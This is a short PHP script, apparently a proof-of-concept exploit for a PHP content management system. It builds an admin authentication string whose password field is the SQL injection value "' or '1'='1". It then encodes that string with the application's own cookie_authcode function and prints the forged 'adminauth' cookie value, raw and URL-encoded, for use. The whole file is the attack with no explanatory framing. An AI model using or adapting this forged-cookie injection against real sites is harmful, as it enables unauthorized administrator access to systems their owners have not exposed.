<?php
include("../common.inc.php");
$row['adminid']='1';
$username = 'admin';
$row['adminpwd'] = "' or '1'='1";

$adminauth=$row['adminid']."\t".$username."\t".$row['adminpwd'];

echo cookie_authcode($adminauth,'ENCODE');
echo '<br/>';
echo urlencode(cookie_authcode($adminauth,'ENCODE'));
exit;
set_cookie('adminauth',cookie_authcode($adminauth,'ENCODE'),time()+3600*12);	//设置12个小时cookie有效期			



?>